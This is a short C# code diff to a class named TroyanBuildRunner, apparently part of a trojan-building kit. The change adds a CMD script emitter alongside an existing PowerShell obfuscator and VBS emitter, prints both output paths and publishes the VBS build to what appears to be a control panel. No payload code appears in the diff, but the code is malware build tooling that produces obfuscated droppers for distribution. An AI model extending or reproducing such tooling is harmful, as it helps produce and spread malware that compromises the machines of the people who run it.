@@ -6,11 +6,16 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
 {
     private readonly IPowerShellObfuscator _obfuscator;
     private readonly ITroyanPlainVbsEmitter _plainVbs;
+    private readonly ITroyanPlainCmdEmitter _plainCmd;
 
-    public TroyanBuildRunner(IPowerShellObfuscator obfuscator, ITroyanPlainVbsEmitter plainVbs)
+    public TroyanBuildRunner(
+        IPowerShellObfuscator obfuscator,
+        ITroyanPlainVbsEmitter plainVbs,
+        ITroyanPlainCmdEmitter plainCmd)
     {
         _obfuscator = obfuscator;
         _plainVbs = plainVbs;
+        _plainCmd = plainCmd;
     }
 
     public void Run(string server, string packId, ServerService panelService)
@@ -33,7 +38,9 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
         }
 
         _plainVbs.Write(layout);
+        _plainCmd.Write(layout);
         Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
+        Console.WriteLine("CMD (_output): " + layout.TroyanOutputCmd);
         panelService.PublishTroyanVbsFromBuildOutput(layout);
     }
 }
